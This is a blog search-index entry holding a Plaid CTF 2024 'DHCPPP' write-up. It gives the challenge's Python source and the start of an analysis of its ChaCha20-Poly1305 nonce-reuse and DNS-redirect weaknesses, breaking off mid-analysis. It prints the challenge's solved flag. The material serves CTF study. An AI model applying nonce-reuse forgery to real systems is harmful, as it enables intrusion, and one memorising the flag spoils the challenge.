<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Plaid CTF 2024 - [DHCPPP] - Misc &amp; Crypto</title>
    <link href="/2024/04/21/plaid24/"/>
    <url>/2024/04/21/plaid24/</url>
    
    <content type="html"><![CDATA[<div class="note note-warning">            <p><strong>Difficulty:</strong> <strong>Medium</strong><br><strong>Category:</strong> <strong>Misc and Cryptography</strong><br><strong>Flag:</strong> <strong><code>PCTF{d0nt_r3u5e_th3_n0nc3_d4839ed727736624}</code></strong></p>          </div><h2 id="Challenge-DHCPPP"><a href="#Challenge-DHCPPP" class="headerlink" title="Challenge: DHCPPP"></a>Challenge: DHCPPP</h2><p>The local latin dance company is hosting a comp. They have a million-dollar wall of lava lamps and prizes so big this must be a once-in-a-lifetime opportunity.</p><p><em>Hypotheses</em>. It’s not DNS &#x2F;&#x2F; There’s no way it’s DNS &#x2F;&#x2F; It was DNS</p><h3 id="Attachment-dhcppp-py"><a href="#Attachment-dhcppp-py" class="headerlink" title="Attachment - dhcppp.py"></a>Attachment - dhcppp.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time, zlib<br><span class="hljs-keyword">import</span> secrets<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20_Poly1305<br><span class="hljs-keyword">import</span> dns.resolver<br><br>CHACHA_KEY = secrets.token_bytes(<span class="hljs-number">32</span>)<br>TIMEOUT = <span class="hljs-number">1e-1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_msg</span>(<span class="hljs-params">msg, nonce</span>):<br>    <span class="hljs-comment"># In case our RNG nonce is repeated, we also hash</span><br>    <span class="hljs-comment"># the message in. This means the worst-case scenario</span><br>    <span class="hljs-comment"># is that our nonce reflects a hash of the message</span><br>    <span class="hljs-comment"># but saves the chance of a nonce being reused across</span><br>    <span class="hljs-comment"># different messages</span><br>    nonce = sha256(msg[:<span class="hljs-number">32</span>] + nonce[:<span class="hljs-number">32</span>])[:<span class="hljs-number">12</span>]<br><br>    cipher = ChaCha20_Poly1305.new(key=CHACHA_KEY, nonce=nonce)<br>    ct, tag = cipher.encrypt_and_digest(msg)<br><br>    <span class="hljs-keyword">return</span> ct+tag+nonce<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_msg</span>(<span class="hljs-params">msg</span>):<br>    ct = msg[:-<span class="hljs-number">28</span>]<br>    tag = msg[-<span class="hljs-number">28</span>:-<span class="hljs-number">12</span>]<br>    nonce = msg[-<span class="hljs-number">12</span>:]<br><br>    cipher = ChaCha20_Poly1305.new(key=CHACHA_KEY, nonce=nonce)<br>    pt = cipher.decrypt_and_verify(ct, tag)<br><br>    <span class="hljs-keyword">return</span> pt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_crc</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">return</span> zlib.crc32(msg).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">return</span> hashlib.sha256(msg).digest()<br><br>RNG_INIT = secrets.token_bytes(<span class="hljs-number">512</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DHCPServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.leases = []<br>        self.ips = [<span class="hljs-string">f&quot;192.168.1.<span class="hljs-subst">&#123;i&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>)]<br>        self.mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1b 7d 6f 49 37 c9&quot;</span>)<br>        self.gateway_ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><br>        self.leases.append((<span class="hljs-string">&quot;192.168.1.2&quot;</span>, <span class="hljs-string">b&quot;rngserver_0&quot;</span>, time.time(), []))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_lease</span>(<span class="hljs-params">self, dev_name</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.ips) != <span class="hljs-number">0</span>:<br>            ip = self.ips.pop(<span class="hljs-number">0</span>)<br>            self.leases.append((ip, dev_name, time.time(), []))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># relinquish the oldest lease</span><br>            old_lease = self.leases.pop(<span class="hljs-number">0</span>)<br>            ip = old_lease[<span class="hljs-number">0</span>]<br>            self.leases.append((ip, dev_name, time.time(), []))<br><br>        pkt = <span class="hljs-built_in">bytearray</span>(<br>            <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>            <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self.gateway_ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>            <span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) +<br>            <span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>]) +<br>            <span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]) +<br>            dev_name +<br>            <span class="hljs-string">b&quot;\x00&quot;</span><br>        )<br><br>        pkt = <span class="hljs-string">b&quot;\x02&quot;</span> + encrypt_msg(pkt, self.get_entropy_from_lavalamps()) + calc_crc(pkt)<br><br>        <span class="hljs-keyword">return</span> pkt<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_entropy_from_lavalamps</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># Get entropy from all available lava-lamp RNG servers</span><br>        <span class="hljs-comment"># Falling back to local RNG if necessary</span><br>        entropy_pool = RNG_INIT<br><br>        <span class="hljs-keyword">for</span> ip, name, ts, tags <span class="hljs-keyword">in</span> self.leases:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;rngserver&quot;</span> <span class="hljs-keyword">in</span> name:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-comment"># get entropy from the server</span><br>                    output = requests.get(<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;ip&#125;</span>/get_rng&quot;</span>, timeout=TIMEOUT).text<br>                    entropy_pool += sha256(output.encode())<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-comment"># if the server is broken, get randomness from local RNG instead</span><br>                    entropy_pool += sha256(secrets.token_bytes(<span class="hljs-number">512</span>))<br><br>        <span class="hljs-keyword">return</span> sha256(entropy_pool)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_pkt</span>(<span class="hljs-params">self, pkt</span>):<br>        <span class="hljs-keyword">assert</span> pkt <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br><br>        src_mac = pkt[:<span class="hljs-number">6</span>]<br>        dst_mac = pkt[<span class="hljs-number">6</span>:<span class="hljs-number">12</span>]<br>        msg = pkt[<span class="hljs-number">12</span>:]<br><br>        <span class="hljs-keyword">if</span> dst_mac != self.mac:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">if</span> src_mac == self.mac:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x01&quot;</span>):<br>            <span class="hljs-comment"># lease request</span><br>            dev_name = msg[<span class="hljs-number">1</span>:]<br>            lease_resp = self.get_lease(dev_name)<br>            <span class="hljs-keyword">return</span> (<br>                self.mac +<br>                src_mac + <span class="hljs-comment"># dest mac</span><br>                lease_resp<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FlagServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, dhcp</span>):<br>        self.mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;53 79 82 b5 97 eb&quot;</span>)<br>        self.dns = dns.resolver.Resolver()<br>        self.process_pkt(dhcp.process_pkt(self.mac+dhcp.mac+<span class="hljs-string">b&quot;\x01&quot;</span>+<span class="hljs-string">b&quot;flag_server&quot;</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_flag</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            flag = f.read().strip()<br>        curl(<span class="hljs-string">&quot;example.com&quot;</span>, <span class="hljs-string">f&quot;/<span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>, self.dns)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_pkt</span>(<span class="hljs-params">self, pkt</span>):<br>        <span class="hljs-keyword">assert</span> pkt <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br><br>        src_mac = pkt[:<span class="hljs-number">6</span>]<br>        dst_mac = pkt[<span class="hljs-number">6</span>:<span class="hljs-number">12</span>]<br>        msg = pkt[<span class="hljs-number">12</span>:]<br><br>        <span class="hljs-keyword">if</span> dst_mac != self.mac:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">if</span> src_mac == self.mac:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x02&quot;</span>):<br>            <span class="hljs-comment"># lease response</span><br>            pkt = msg[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>]<br>            pkt = decrypt_msg(pkt)<br>            crc = msg[-<span class="hljs-number">4</span>:]<br>            <span class="hljs-keyword">assert</span> crc == calc_crc(pkt)<br><br>            self.ip = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>            self.gateway_ip = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])<br>            self.subnet_mask = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>])<br>            self.dns1 = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>])<br>            self.dns2 = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">16</span>:<span class="hljs-number">20</span>])<br>            self.dns.nameservers = [self.dns1, self.dns2]<br>            <span class="hljs-keyword">assert</span> pkt.endswith(<span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FLAG SERVER] [DEBUG] Got DHCP lease&quot;</span>, self.ip, self.gateway_ip, self.subnet_mask, self.dns1, self.dns2)<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x03&quot;</span>):<br>            <span class="hljs-comment"># FREE FLAGES!!!!!!!</span><br>            self.send_flag()<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">curl</span>(<span class="hljs-params">url, path, dns</span>):<br>    ip = <span class="hljs-built_in">str</span>(dns.resolve(url).response.resolve_chaining().answer).strip().split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>]<br>    url = <span class="hljs-string">&quot;http://&quot;</span> + ip<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Sending flage to <span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>    requests.get(url + path)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    dhcp = DHCPServer()<br>    flagserver = FlagServer(dhcp)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        pkt = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).strip())<br><br>        out = dhcp.process_pkt(pkt)<br>        <span class="hljs-keyword">if</span> out <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(out.<span class="hljs-built_in">hex</span>())<br><br>        out = flagserver.process_pkt(pkt)<br>        <span class="hljs-keyword">if</span> out <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(out.<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>At first glance, we can make out a couple of helper functions, a <strong>main</strong> function as well as two server classes: A <strong>DhcpServer</strong> and a <strong>FlagServer</strong>. Let’s take a deep dive into the code to understand the provided funtions.</p><h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><p>The <strong>main</strong> function creates an instance of the <strong>DhcpServer</strong> class and an instance of the <strong>FlagServer</strong> class (which is using the DhcpServer instance). Then it enters an infinite loop of reading hex encoded packet data from the command line, passing it to both server instances and printing their outputs &#x2F; return values as hex. Additionally, we can see that both servers declare a <code>process_pkt(packet)</code> function, which seems to handle the incoming requests for the respective server.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    dhcp = DHCPServer()<br>    flagserver = FlagServer(dhcp)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        pkt = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).strip())<br><br>        out = dhcp.process_pkt(pkt)<br>        <span class="hljs-keyword">if</span> out <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(out.<span class="hljs-built_in">hex</span>())<br><br>        out = flagserver.process_pkt(pkt)<br>        <span class="hljs-keyword">if</span> out <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(out.<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h3 id="Helper-functions-and-static-data"><a href="#Helper-functions-and-static-data" class="headerlink" title="Helper functions and static data"></a>Helper functions and static data</h3><p>When analyzing the helper functions and static data, we can see two randomly-generated byte strings that are generated in a cryptographically secure way: <code>CHACHA_KEY</code> and the <code>RNG_INIT</code>, with lengths of 32 and 512 bytes, respectively.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secrets<br><br>CHACHA_KEY = secrets.token_bytes(<span class="hljs-number">32</span>)<br>RNG_INIT = secrets.token_bytes(<span class="hljs-number">512</span>)<br></code></pre></td></tr></table></figure><p>Additionally, there are helper functions to compute a <strong>crc32</strong> checksum and a <strong>SHA256</strong> hash - nothing out of the ordinary.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_crc</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">return</span> zlib.crc32(msg).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">return</span> hashlib.sha256(msg).digest()<br></code></pre></td></tr></table></figure><p>We also have some functions to encrypt and decrypt data using the <strong>ChaCha20_Poly1305</strong> algorithm, which uses a <code>key</code> and a <code>nonce</code> to encrypt a <code>message</code> and produces a <code>ciphertext</code> and an authentication <code>tag</code> (a.k.a. message authentication code or MAC for short - not to be confused with a <em>MAC address</em> though).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20_Poly1305<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_msg</span>(<span class="hljs-params">msg, nonce</span>):<br>    <span class="hljs-comment"># In case our RNG nonce is repeated, we also hash</span><br>    <span class="hljs-comment"># the message in. This means the worst-case scenario</span><br>    <span class="hljs-comment"># is that our nonce reflects a hash of the message</span><br>    <span class="hljs-comment"># but saves the chance of a nonce being reused across</span><br>    <span class="hljs-comment"># different messages</span><br>    nonce = sha256(msg[:<span class="hljs-number">32</span>] + nonce[:<span class="hljs-number">32</span>])[:<span class="hljs-number">12</span>]<br><br>    cipher = ChaCha20_Poly1305.new(key=CHACHA_KEY, nonce=nonce)<br>    ct, tag = cipher.encrypt_and_digest(msg)<br><br>    <span class="hljs-keyword">return</span> ct+tag+nonce<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_msg</span>(<span class="hljs-params">msg</span>):<br>    ct = msg[:-<span class="hljs-number">28</span>]<br>    tag = msg[-<span class="hljs-number">28</span>:-<span class="hljs-number">12</span>]<br>    nonce = msg[-<span class="hljs-number">12</span>:]<br><br>    cipher = ChaCha20_Poly1305.new(key=CHACHA_KEY, nonce=nonce)<br>    pt = cipher.decrypt_and_verify(ct, tag)<br><br>    <span class="hljs-keyword">return</span> pt<br></code></pre></td></tr></table></figure><p>A couple of things to note here:</p><ul><li>Typically you’re able to reuse the key for ChaCha20_Poly1305, as long as you’re using a different nonce for each message encryption; otherwise this algorithm is known to lose confidentiality for messages encrypted using the same nonce.</li><li>Assuming an attacker can control the first 32 bytes of the <code>message</code> and the <code>nonce</code> parameters, the nonce used during the encryption can suffer from a <code>key and nonce reuse attack</code> depending on the provided parameters.</li><li>The <code>decrypt_msg</code> function does not validate that the <code>nonce</code>, supplied with the encrypted message <code>msg</code>, adheres to the pattern used to contruct the <code>nonce</code> in the <code>encrypt_msg</code> function.</li><li>Both the <code>encrypt_msg</code> and the <code>decrypt_msg</code> functions use the same static key <code>CHACHA_KEY</code> for the <strong>ChaCha20_Poly1305</strong> cipher.</li></ul><p>Lastly, there’s the custom <code>curl</code> function, which looks like it’s trying to resolve a domain using a specified <strong>DNS server</strong> instance and then sending an http <strong>GET</strong> request to the corresponding IP address. We’ll come back to this once we analyze the <strong>FlagServer</strong>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> dns.resolver<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">curl</span>(<span class="hljs-params">url, path, dns</span>):<br>    ip = <span class="hljs-built_in">str</span>(dns.resolve(url).response.resolve_chaining().answer).strip().split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>]<br>    url = <span class="hljs-string">&quot;http://&quot;</span> + ip<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Sending flage to <span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>    requests.get(url + path)<br></code></pre></td></tr></table></figure><h3 id="DhcpServer"><a href="#DhcpServer" class="headerlink" title="DhcpServer"></a>DhcpServer</h3><p>Now that we’ve seen the helper functions, let’s come back to the server classes: Starting with the <strong>DhcpServer</strong>.</p><p>The <code>__init__</code> function of this class declares two lists <code>leases</code> and <code>ips</code> which will contain the provided leases and the available ips for this DhcpServer. Additionally, it sets its <strong>MAC address</strong> to the static hex value <code>1b 7d 6f 49 37 c9</code>, sets its gateway to <code>192.168.1.1</code>, and leases out the IP address <code>192.168.1.2</code> to a server named <code>rngserver_0</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DHCPServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.leases = []<br>        self.ips = [<span class="hljs-string">f&quot;192.168.1.<span class="hljs-subst">&#123;i&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>)]<br>        self.mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1b 7d 6f 49 37 c9&quot;</span>)<br>        self.gateway_ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><br>        self.leases.append((<span class="hljs-string">&quot;192.168.1.2&quot;</span>, <span class="hljs-string">b&quot;rngserver_0&quot;</span>, time.time(), []))<br></code></pre></td></tr></table></figure><p>Now let’s analyze the <code>process_pkt</code> function:</p><ul><li>We can deduce some of the structure of the packet data: Each packet is supposed to start with a 6 byte MAC address corresponding to the sender of the packet, followed by another 6 byte MAC address of the receiver of the packet. The rest of the packet will contain the actual message.</li><li>The DhcpServer will only process packets that are meant to be routed to it and don’t originate from itself.</li><li>If the message does not start with a <code>0x01</code>-byte, the DhcpServer will reject the packet.</li><li>Otherwise it will interpret the message-content following the <code>0x01</code>-byte, which is reminiscent of a <strong>DHCP discovery message</strong>, as the server name, try to lease an IP address to it and construct and return a response packet, that follows the same structure of sender MAC address followed by receiver MAC address and the actual message, to the sender of the current packet.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> 